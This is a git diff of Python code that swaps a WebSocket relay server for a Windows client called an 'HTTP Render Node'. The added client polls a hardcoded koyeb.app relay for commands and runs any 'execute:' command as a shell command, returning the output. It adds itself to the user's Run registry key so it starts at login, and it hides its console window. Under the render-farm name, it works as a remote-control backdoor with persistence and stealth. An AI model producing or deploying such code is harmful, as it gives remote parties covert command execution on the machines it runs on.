@@ -1,289 +1,270 @@
-#!/usr/bin/env python3
-"""
-Koyeb Relay Server - Fixed Version with Separate HTTP/WebSocket
-"""
-import asyncio
-import websockets
-import json
-import logging
+import subprocess
+import sys
 import os
-from datetime import datetime
-import uuid
-from aiohttp import web
+import time
 import threading
+import json
+import winreg
+from pathlib import Path
+import platform
+import uuid
+import requests
+from datetime import datetime
 
-# Configure logging
-logging.basicConfig(level=logging.INFO, format='%(message)s')
-logger = logging.getLogger("KoyebRelay")
-
-class KoyebRelay:
+class HTTPRenderNode:
     def __init__(self):
-        self.controllers = set()
-        self.nodes = {}
-        self.node_info = {}
-        
-    async def handle_websocket(self, websocket, path):
-        """Handle WebSocket connections"""
-        client_ip = websocket.remote_address[0] if websocket.remote_address else 'unknown'
-        logger.info(f"WebSocket connection from {client_ip}")
-        
-        try:
-            # Wait for client identification
-            message = await asyncio.wait_for(websocket.recv(), timeout=15.0)
-            data = json.loads(message)
-            
-            client_type = data.get('type')
-            if client_type == 'controller':
-                await self.handle_controller(websocket, data)
-            elif client_type == 'node':
-                await self.handle_node(websocket, data)
-            else:
-                await websocket.close(1008, "Invalid client type")
-                
-        except asyncio.TimeoutError:
-            logger.warning(f"WebSocket timeout from {client_ip}")
-        except json.JSONDecodeError:
-            logger.warning(f"Invalid JSON from {client_ip}")
-        except Exception as e:
-            logger.error(f"WebSocket error: {e}")
-
-    async def handle_controller(self, websocket, data):
-        """Handle controller connection"""
-        controller_id = str(uuid.uuid4())
-        self.controllers.add(websocket)
-        
-        logger.info(f"Controller connected: {controller_id}")
-        
-        # Send welcome with current nodes
-        await websocket.send(json.dumps({
-            'type': 'welcome',
-            'controller_id': controller_id,
-            'message': 'Connected to Koyeb Relay',
-            'nodes': list(self.node_info.values()),
-            'timestamp': datetime.utcnow().isoformat() + 'Z'
-        }))
-        
-        try:
-            async for message in websocket:
-                try:
-                    cmd_data = json.loads(message)
-                    await self.process_controller_command(controller_id, cmd_data)
-                except json.JSONDecodeError:
-                    await websocket.send(json.dumps({
-                        'type': 'error',
-                        'message': 'Invalid JSON'
-                    }))
-        except Exception as e:
-            logger.error(f"Controller error: {e}")
-        finally:
-            self.controllers.discard(websocket)
-            logger.info(f"Controller disconnected: {controller_id}")
-
-    async def handle_node(self, websocket, data):
-        """Handle node connection"""
-        node_id = str(uuid.uuid4())
-        node_name = data.get('node_name', f'node-{node_id[:8]}')
-        
-        self.nodes[node_id] = websocket
-        self.node_info[node_id] = {
-            'node_id': node_id,
-            'node_name': node_name,
-            'computer_name': data.get('computer_name', 'Unknown'),
-            'status': 'online',
-            'connected_at': datetime.utcnow().isoformat() + 'Z',
-            'last_heartbeat': datetime.utcnow().isoformat() + 'Z'
+        # Cloud relay configuration
+        self.relay_config = {
+            'relay_url': 'https://mathematical-judy-bageltigerstudeos-3479b0db.koyeb.app',
+            'heartbeat_interval': 30,
+            'reconnect_delay': 5
         }
         
-        logger.info(f"Node registered: {node_name}")
+        self.config = {
+            'render_app': r'C:\Path\To\Your\Renderer.exe',
+            'work_dir': r'C:\render_farm\work',
+            'max_restarts': 9999,
+            'restart_delay': 5
+        }
         
-        # Notify all controllers
-        await self.broadcast_to_controllers({
-            'type': 'node_connected',
-            'node': self.node_info[node_id]
-        })
+        # Setup directories
+        Path(self.config['work_dir']).mkdir(parents=True, exist_ok=True)
         
-        # Send confirmation to node
-        await websocket.send(json.dumps({
-            'type': 'registered',
-            'node_id': node_id,
-            'message': 'Successfully registered with Koyeb relay'
-        }))
+        # State management
+        self.restart_count = 0
+        self.is_running = True
+        self.current_process = None
+        self.node_id = None
+        
+        # Get node identity
+        self.node_info = self.get_node_identity()
+        
+        # Setup auto-start
+        self.setup_autostart()
+        
+        print(f"☁️  HTTP Render Node '{self.node_info['node_name']}' starting...")
+        print(f"   Relay: {self.relay_config['relay_url']}")
+        
+    def get_node_identity(self):
+        """Get or create this node's identity"""
+        identity_file = Path('node_identity.json')
+        if identity_file.exists():
+            try:
+                with open(identity_file, 'r') as f:
+                    return json.load(f)
+            except:
+                pass
+        
+        computer_name = platform.node()
+        identity = {
+            'node_name': f"Node-{computer_name}",
+            'computer_name': computer_name,
+            'system_type': 'render_node',
+            'version': '1.0'
+        }
         
         try:
-            async for message in websocket:
-                try:
-                    msg_data = json.loads(message)
-                    await self.process_node_message(node_id, msg_data)
-                except json.JSONDecodeError:
-                    pass  # Ignore invalid JSON from nodes
-                    
-        except Exception as e:
-            logger.error(f"Node error {node_name}: {e}")
-        finally:
-            await self.cleanup_node(node_id)
+            with open(identity_file, 'w') as f:
+                json.dump(identity, f, indent=2)
+        except:
+            pass
+            
+        return identity
 
-    async def process_controller_command(self, controller_id, data):
-        """Process commands from controllers"""
-        if data.get('type') == 'command':
-            node_name = data.get('node_name')
-            command = data.get('command')
-            command_id = data.get('command_id', str(uuid.uuid4()))
+    def register_with_relay(self):
+        """Register this node with the cloud relay"""
+        try:
+            response = requests.post(
+                f"{self.relay_config['relay_url']}/node/register",
+                json={
+                    'node_name': self.node_info['node_name'],
+                    'computer_name': self.node_info['computer_name'],
+                    'system_info': {
+                        'os': platform.system(),
+                        'processor': platform.processor()
+                    }
+                },
+                timeout=10
+            )
             
-            logger.info(f"Command from {controller_id} to {node_name}: {command}")
-            
-            # Find target node
-            target_node_id = None
-            for node_id, info in self.node_info.items():
-                if info['node_name'] == node_name:
-                    target_node_id = node_id
-                    break
-            
-            if target_node_id and target_node_id in self.nodes:
-                await self.nodes[target_node_id].send(json.dumps({
-                    'type': 'command',
-                    'command': command,
-                    'command_id': command_id,
-                    'from_controller': controller_id
-                }))
-                
-                # Send queued confirmation
-                await self.send_to_controller(controller_id, {
-                    'type': 'command_queued',
-                    'command_id': command_id,
-                    'node_name': node_name
-                })
+            if response.status_code == 200:
+                data = response.json()
+                self.node_id = data.get('node_id')
+                print(f"✅ Registered with relay. Node ID: {self.node_id}")
+                return True
             else:
-                await self.send_to_controller(controller_id, {
-                    'type': 'error',
-                    'command_id': command_id,
-                    'message': f'Node {node_name} not found'
-                })
-
-    async def process_node_message(self, node_id, data):
-        """Process messages from nodes"""
-        if data.get('type') == 'heartbeat':
-            # Update heartbeat
-            if node_id in self.node_info:
-                self.node_info[node_id]['last_heartbeat'] = datetime.utcnow().isoformat() + 'Z'
+                print(f"❌ Registration failed: {response.text}")
+                return False
                 
-        elif data.get('type') == 'command_response':
-            # Forward response to controller
-            controller_id = data.get('controller_id')
-            await self.send_to_controller(controller_id, {
-                'type': 'command_response',
-                'node_name': self.node_info.get(node_id, {}).get('node_name'),
-                'response': data.get('response', {}),
-                'command_id': data.get('command_id'),
-                'success': data.get('success', True)
-            })
+        except Exception as e:
+            print(f"❌ Registration error: {e}")
+            return False
 
-    async def send_to_controller(self, controller_id, message):
-        """Send message to specific controller"""
-        for controller in self.controllers:
-            try:
-                await controller.send(json.dumps(message))
-                break
-            except:
-                continue
+    def send_heartbeat(self):
+        """Send heartbeat and check for commands"""
+        if not self.node_id:
+            return []
+            
+        try:
+            response = requests.post(
+                f"{self.relay_config['relay_url']}/node/heartbeat",
+                json={'node_id': self.node_id},
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                data = response.json()
+                return data.get('commands', [])
+            else:
+                print(f"❌ Heartbeat failed: {response.text}")
+                return []
+                
+        except Exception as e:
+            print(f"❌ Heartbeat error: {e}")
+            return []
 
-    async def broadcast_to_controllers(self, message):
-        """Broadcast message to all controllers"""
-        disconnected = []
-        for controller in self.controllers:
-            try:
-                await controller.send(json.dumps(message))
-            except:
-                disconnected.append(controller)
+    def send_command_response(self, command_id, response):
+        """Send command response back to relay"""
+        try:
+            requests.post(
+                f"{self.relay_config['relay_url']}/command/response",
+                json={
+                    'command_id': command_id,
+                    'response': response
+                },
+                timeout=10
+            )
+        except Exception as e:
+            print(f"❌ Response send error: {e}")
+
+    def handle_command(self, command):
+        """Execute commands and return output"""
+        try:
+            if command == 'status':
+                return {
+                    'status': 'running', 
+                    'restarts': self.restart_count,
+                    'renderer_running': self.current_process and self.current_process.poll() is None
+                }
+            
+            elif command == 'stop':
+                self.is_running = False
+                if self.current_process:
+                    self.current_process.terminate()
+                return {'status': 'shutting_down'}
+            
+            elif command.startswith('execute:'):
+                cmd = command[8:]
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+                return {
+                    'returncode': result.returncode,
+                    'stdout': result.stdout,
+                    'stderr': result.stderr
+                }
+            
+            elif command == 'restart_renderer':
+                if self.current_process:
+                    self.current_process.terminate()
+                return {'status': 'renderer_restarting'}
+            
+            else:
+                return {'error': f'Unknown command: {command}'}
+                
+        except Exception as e:
+            return {'error': str(e)}
+
+    def process_commands(self, commands):
+        """Process received commands"""
+        for command_data in commands:
+            command_id = command_data.get('command_id')
+            command = command_data.get('command')
+            
+            print(f"📨 Received command: {command}")
+            
+            # Execute command
+            response = self.handle_command(command)
+            
+            # Send response back
+            self.send_command_response(command_id, response)
+
+    def run_renderer(self):
+        """Run the renderer application"""
+        try:
+            self.current_process = subprocess.Popen(
+                [self.config['render_app'], self.config['work_dir']],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            return self.current_process.wait()
+        except Exception as e:
+            print(f"Renderer error: {e}")
+            return 1
+
+    def start_heartbeat_loop(self):
+        """Start the heartbeat and command processing loop"""
+        def heartbeat_loop():
+            while self.is_running:
+                try:
+                    # Send heartbeat and get commands
+                    commands = self.send_heartbeat()
+                    
+                    # Process any received commands
+                    if commands:
+                        self.process_commands(commands)
+                        
+                except Exception as e:
+                    print(f"❌ Heartbeat loop error: {e}")
+                
+                time.sleep(self.relay_config['heartbeat_interval'])
         
-        for controller in disconnected:
-            self.controllers.discard(controller)
+        thread = threading.Thread(target=heartbeat_loop, daemon=True)
+        thread.start()
 
-    async def cleanup_node(self, node_id):
-        """Clean up node resources"""
-        if node_id in self.nodes:
-            del self.nodes[node_id]
+    def start(self):
+        """Main execution loop"""
+        print("Starting HTTP render node...")
+        
+        # Register with relay
+        if not self.register_with_relay():
+            print("❌ Failed to register with relay. Retrying in background...")
+            # Continue anyway, will retry registration in heartbeat
+        
+        # Start heartbeat loop
+        self.start_heartbeat_loop()
+        
+        # Main render loop
+        while self.is_running and self.restart_count < self.config['max_restarts']:
+            self.restart_count += 1
+            print(f"Render restart #{self.restart_count}")
             
-        if node_id in self.node_info:
-            node_name = self.node_info[node_id]['node_name']
-            del self.node_info[node_id]
-            logger.info(f"Node disconnected: {node_name}")
+            exit_code = self.run_renderer()
             
-            await self.broadcast_to_controllers({
-                'type': 'node_disconnected',
-                'node_name': node_name
-            })
+            if not self.is_running:
+                break
+                
+            print(f"Renderer exited with code {exit_code}, restarting in {self.config['restart_delay']}s...")
+            time.sleep(self.config['restart_delay'])
+        
+        print("HTTP render node shutting down")
 
-# HTTP Server for Health Checks
-async def health_check(request):
-    """Handle Koyeb health checks"""
-    return web.Response(text="OK", status=200)
-
-async def status(request):
-    """Status page with relay information"""
-    return web.json_response({
-        'status': 'healthy',
-        'service': 'render-farm-relay',
-        'timestamp': datetime.utcnow().isoformat() + 'Z'
-    })
-
-async def start_http_server():
-    """Start HTTP server for health checks"""
-    app = web.Application()
-    app.router.add_get('/', health_check)
-    app.router.add_get('/health', health_check)
-    app.router.add_get('/status', status)
-    
-    port = int(os.getenv('PORT', 8000))
-    runner = web.AppRunner(app)
-    await runner.setup()
-    
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
-    
-    logger.info(f"🏥 HTTP Server running on port {port}")
-    logger.info("🔍 Health check: https://your-app-name.koyeb.app/health")
-    return runner
-
-async def start_websocket_server():
-    """Start WebSocket server on a different port"""
-    relay = KoyebRelay()
-    
-    # Use a different port for WebSockets to avoid conflicts
-    ws_port = int(os.getenv('WS_PORT', 8001))
-    
-    # Start WebSocket server
-    ws_server = await websockets.serve(
-        relay.handle_websocket,
-        "0.0.0.0",
-        ws_port,
-        ping_interval=20,
-        ping_timeout=10
-    )
-    
-    logger.info(f"📡 WebSocket Server running on port {ws_port}")
-    logger.info("🌐 WebSocket URL: wss://your-app-name.koyeb.app:8001")
-    logger.info("💚 Ready for controllers and nodes!")
-    
-    return ws_server
-
-async def main():
-    """Main application entry point"""
-    # Start both servers
-    http_runner = await start_http_server()
-    ws_server = await start_websocket_server()
-    
-    # Keep both servers running
-    try:
-        await asyncio.Future()  # Run forever
-    finally:
-        await ws_server.wait_closed()
-        await http_runner.cleanup()
+    def setup_autostart(self):
+        """Register for auto-start without admin rights"""
+        try:
+            key = winreg.HKEY_CURRENT_USER
+            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+                winreg.SetValueEx(reg_key, "HTTPRenderNode", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
+            print("Auto-start configured successfully")
+        except Exception as e:
+            print(f"Auto-start configuration failed: {e}")
 
 if __name__ == "__main__":
+    # Hide console window
     try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        logger.info("Server stopped by user")
-    except Exception as e:
-        logger.error(f"Server error: {e}")
-        raise
+        import ctypes
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    except:
+        pass
+    
+    node = HTTPRenderNode()
+    node.start()
